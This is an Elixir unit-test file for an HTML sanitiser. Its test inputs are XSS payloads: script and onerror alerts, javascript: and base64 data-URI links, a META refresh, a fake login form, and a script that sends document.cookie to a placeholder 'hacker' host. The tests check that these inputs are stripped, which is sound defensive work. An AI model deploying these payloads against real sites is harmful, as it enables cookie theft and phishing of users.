defmodule Ammoniex.HtmlTest do
  use ExUnit.Case
  doctest Ammoniex.HTML

  test "Cleans script tags" do
    dodgy = "<script>alert('hacked')</script>"

    assert Ammoniex.HTML.clean(dodgy) == ""
  end

  test "Cleans img tag" do
    dodgy = "<b><img src='' onerror=alert('hax')>I'm not trying to XSS you</b>"

    assert Ammoniex.HTML.clean(dodgy) == "<b><img src=\"\">I'm not trying to XSS you</b>"
  end

  test "Cleans a tag" do
    dodgy = ~s[<a onclick="function() { alert("hello")">hijack</a>]
    assert Ammoniex.HTML.clean(dodgy) == "<a rel=\"noopener noreferrer\">hijack</a>"
  end

  test "Remove attributes" do
    dodgy = ~s[an <a href=\"javascript:evil()\">evil</a> example]

    assert Ammoniex.HTML.clean(dodgy) ==
             "an <a rel=\"noopener noreferrer\">evil</a> example"
  end

  test "Disallows iframes" do
    dodgy = ~s[<iframe source="http://localhost:5000/hacking"></iframe>]

    assert Ammoniex.HTML.clean(dodgy) == ""
  end

  test "disallows styles" do
    dodgy = ~s[<style type="text/css">@font-face {}</style>]

    assert Ammoniex.HTML.clean(dodgy) == ""
  end

  test "cleans base64" do
    dodgy =
      ~s[<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgna25pZ2h0c3RpY2sgd2FzIGhlcmUnKTwvc2NyaXB0Pg==">HACK HACK HACK</a>]

    assert Ammoniex.HTML.clean(dodgy) ==
             "<a rel=\"noopener noreferrer\">HACK HACK HACK</a>"
  end

  test "cleans cookie theft" do
    dodgy =
      ~s[<SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>]

    assert Ammoniex.HTML.clean(dodgy) ==
             ""
  end

  test "cleans URI encoded script" do
    dodgy = ~s[<IMG SRC=j&#X41vascript:alert('test2')>]

    assert Ammoniex.HTML.clean(dodgy) == "<img>"
  end

  test "deals with forms" do
    dodgy = """
    <h3>Please login to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
    """

    assert Ammoniex.HTML.clean(dodgy) ==
             "<h3>Please login to proceed</h3> Username:<br><br>Password:<br><br><br><br>\n"
  end

  test "deals with meta tags" do
    dodgy =
      ~s[<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">]

    assert Ammoniex.HTML.clean(dodgy) == ""
  end
end
